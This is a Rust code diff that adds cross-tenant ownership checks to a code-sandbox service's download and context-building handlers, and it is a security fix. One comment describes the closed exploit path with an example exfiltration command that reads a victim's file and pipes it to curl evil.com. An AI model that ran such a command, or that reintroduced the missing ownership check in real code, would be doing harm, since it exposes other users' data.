@@ -317,40 +317,56 @@ pub struct DownloadQuery {
 }
 
 pub async fn download_handler(
-    _auth: RequirePermissions<(CodeSandboxExecute,)>,
+    auth: RequirePermissions<(CodeSandboxExecute,)>,
     ConversationIdHeader(conversation_id): ConversationIdHeader,
     Query(q): Query<DownloadQuery>,
-) -> Result<axum::response::Response, (StatusCode, String)> {
+) -> Result<axum::response::Response, crate::common::AppError> {
     use axum::body::Body;
     use axum::response::Response;
 
-    let state = config::get_state().ok_or((
-        StatusCode::SERVICE_UNAVAILABLE,
-        "code_sandbox not initialized".to_string(),
-    ))?;
+    let state = config::get_state().ok_or_else(|| {
+        crate::common::AppError::new(
+            StatusCode::SERVICE_UNAVAILABLE,
+            "SANDBOX_NOT_INITIALIZED",
+            "code_sandbox not initialized",
+        )
+    })?;
 
     // Download is per-conversation; require the header.
-    let conversation_id = conversation_id.ok_or((
-        StatusCode::BAD_REQUEST,
-        "x-conversation-id header required for file download".to_string(),
-    ))?;
+    let conversation_id = conversation_id.ok_or_else(|| {
+        crate::common::AppError::new(
+            StatusCode::BAD_REQUEST,
+            "MISSING_CONVERSATION_ID",
+            "x-conversation-id header required for file download",
+        )
+    })?;
+
+    // SECURITY: same cross-tenant guard as `jsonrpc_handler`. Without
+    // this, any user with `code_sandbox::execute` could fetch another
+    // user's workspace artifacts by passing their conversation_id in
+    // the header.
+    let user_id = auth.user.id;
+    assert_owns_conversation(conversation_id, user_id).await?;
 
     let workspace = workspace_for(&state, conversation_id);
     let path = crate::modules::code_sandbox::tools::files::canonicalize_in_workspace(
         &workspace, &q.filename,
-    )
-    .map_err(|e| (StatusCode::BAD_REQUEST, format!("invalid filename: {e:?}")))?;
+    )?;
 
-    let bytes = tokio::fs::read(&path)
-        .await
-        .map_err(|e| (StatusCode::NOT_FOUND, format!("read: {e}")))?;
+    let bytes = tokio::fs::read(&path).await.map_err(|e| {
+        crate::common::AppError::new(
+            StatusCode::NOT_FOUND,
+            "FILE_NOT_FOUND",
+            format!("read {}: {e}", path.display()),
+        )
+    })?;
 
     let content_type = mime_guess::from_path(&q.filename)
         .first_or_octet_stream()
         .essence_str()
         .to_string();
 
-    Ok(Response::builder()
+    Response::builder()
         .status(StatusCode::OK)
         .header("Content-Type", content_type)
         .header(
@@ -361,7 +377,13 @@ pub async fn download_handler(
             ),
         )
         .body(Body::from(bytes))
-        .unwrap())
+        .map_err(|e| {
+            crate::common::AppError::new(
+                StatusCode::INTERNAL_SERVER_ERROR,
+                "RESPONSE_BUILD_FAILED",
+                format!("download response: {e}"),
+            )
+        })
 }
 
 fn basename(name: &str) -> String {
@@ -412,6 +434,20 @@ async fn build_context(
     conversation_id: Uuid,
     user_id: Uuid,
 ) -> Result<SandboxContext, crate::common::AppError> {
+    // SECURITY: verify the JWT-authenticated caller actually owns this
+    // conversation. Without this check, any authenticated user with
+    // `code_sandbox::execute` (granted to the default Users group by
+    // migration 35 — i.e. every user) could spoof `x-conversation-id`
+    // to another user's conversation, get their attachments staged via
+    // `stage_attachments`, see them bind-mounted into a sandbox the
+    // caller controls (`sandbox.rs::build_bwrap_argv` does NOT filter
+    // by user_id), and exfiltrate via `execute_command("cat
+    // victim.csv && curl evil.com ...")`. The downstream `user_id ==
+    // ctx.user_id` filters in tools/files.rs cover `read_file` and
+    // `get_resource_link` but NOT the bwrap bind path or
+    // `download_handler`.
+    assert_owns_conversation(conversation_id, user_id).await?;
+
     let workspace = workspace_for(state, conversation_id);
     tokio::fs::create_dir_all(&workspace).await.map_err(|e| {
         crate::common::AppError::new(
@@ -515,6 +551,41 @@ fn workspace_for(state: &CodeSandboxState, conversation_id: Uuid) -> std::path::
     state
         .workspace_root
         .join(conversation_id.to_string())
+}
+
+/// SECURITY: assert that the JWT-authenticated `user_id` is the owner
+/// of `conversation_id`. Returns the same 404 error for "conversation
+/// does not exist" and "exists but caller is not owner" to avoid
+/// leaking conversation existence across users.
+///
+/// Call this at every entry point that resolves resources by
+/// conversation_id (per-call dispatch in `jsonrpc_handler` and the
+/// workspace download in `download_handler`). The repository layer
+/// does NOT enforce this — `get_conversation_files` was deliberately
+/// loosened to a single-argument query so the ownership policy lives
+/// in one place at the handler boundary.
+async fn assert_owns_conversation(
+    conversation_id: Uuid,
+    user_id: Uuid,
+) -> Result<(), crate::common::AppError> {
+    let owner = Repos
+        .code_sandbox
+        .get_conversation_user_id(conversation_id)
+        .await?;
+    if owner != Some(user_id) {
+        tracing::warn!(
+            requested_conversation_id = %conversation_id,
+            caller_user_id = %user_id,
+            owner_user_id = ?owner,
+            "code_sandbox: rejected cross-tenant conversation access"
+        );
+        return Err(crate::common::AppError::new(
+            StatusCode::NOT_FOUND,
+            "CONVERSATION_NOT_FOUND",
+            format!("conversation {conversation_id} not found"),
+        ));
+    }
+    Ok(())
 }
 
 // --------------------------------------------------------------------
@@ -860,4 +931,5 @@ mod tests {
         // ".config.json" has extension "json".
         assert_eq!(super::attachment_extension(".config.json"), "json");
     }
+
 }
